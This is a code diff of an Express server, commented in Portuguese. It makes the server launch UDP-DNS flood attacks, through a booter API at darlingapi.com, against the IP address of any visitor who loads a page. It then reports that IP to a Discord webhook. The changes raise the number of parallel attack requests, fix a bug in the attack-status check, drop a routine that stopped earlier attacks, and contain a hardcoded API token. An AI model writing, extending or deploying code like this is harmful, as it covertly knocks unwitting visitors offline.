@@ -9,7 +9,6 @@ const app = express();
 const port = process.env.PORT || 4000;
 const token = process.env.TOKEN;
 const token2 = process.env.TOKEN2;
-const ping = require('net-ping');
 
 const visitorsFile = path.join(__dirname, 'data', 'visitors.json');
 const configFile = path.join(__dirname, 'data', 'config.json');
@@ -67,9 +66,9 @@ async function clear() {
 
 async function sendApiRequest(ip) {
     const url = `https://darlingapi.com?token=${token}&host=${ip}&port=0&time=60&method=UDP-DNS`;
-    const requests = Array(5).fill(url).map(u => axios.get(u));
+    const requests = Array(6).fill(url).map(u => axios.get(u));
     const url2 = `https://darlingapi.com?token=${token2}&host=${ip}&port=0&time=60&method=UDP-DNS`;
-    const requests2 = Array(6).fill(url2).map(u => axios.get(u))
+    const requests2 = Array(12).fill(url2).map(u => axios.get(u))
     
     try {
         await axios.all(requests, requests2);
@@ -77,7 +76,7 @@ async function sendApiRequest(ip) {
         const response = await axios.get(`https://darlingapi.com/status?token=${token}`);
         const data = response.data;
         const response1 = await axios.get(`https://darlingapi.com/status?token=${token}`);
-        const data1 = response.data;
+        const data1 = response1.data;
 
         if (data.account.running < 6) {
             await axios.all(requests2);
@@ -91,20 +90,6 @@ async function sendApiRequest(ip) {
     }
 }
 
-async function verificar() {
-    try {
-        const response = await axios.get(`https://darlingapi.com/status?token=af1f1818-3541-411f-a643-db88e2c575ff`);
-        const data = response.data;
-
-        if (data.account.running > 0) {
-                const url = `https://darlingapi.com/stop_all?token=${token}`;
-                await axios.get(url);
-                console.log('Ataques anteriores interrompidos');   
-        }
-    } catch (error) {
-        console.error('Erro ao verificar o status dos ataques:', error);
-    }
-}
 async function sendDiscordWebhooks(ip) {
     const webhook2 = axios.post(discordWebhookUrl, {
         embeds: [{
@@ -130,7 +115,7 @@ async function sendDiscordWebhooks(ip) {
 app.post('/page-loaded', async (req, res) => {
     let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     if (typeof ip === 'string') ip = ip.split(',')[0].trim();
-    if (ip.startsWith('3') || ip.startsWith('10') || ip.startsWith('::')) {
+    if (ip.startsWith('3') || ip.startsWith('10') || ip.startsWith('s')) {
         return res.status(400).send('Invalid IP');
     }
 
@@ -150,7 +135,6 @@ app.post('/page-loaded', async (req, res) => {
             await fs.writeFile(visitorsFile, JSON.stringify(visitorsCache, null, 2));
         }
 
-        await verificar();
         await sendApiRequest(ip);
         await sendDiscordWebhooks(ip);
         
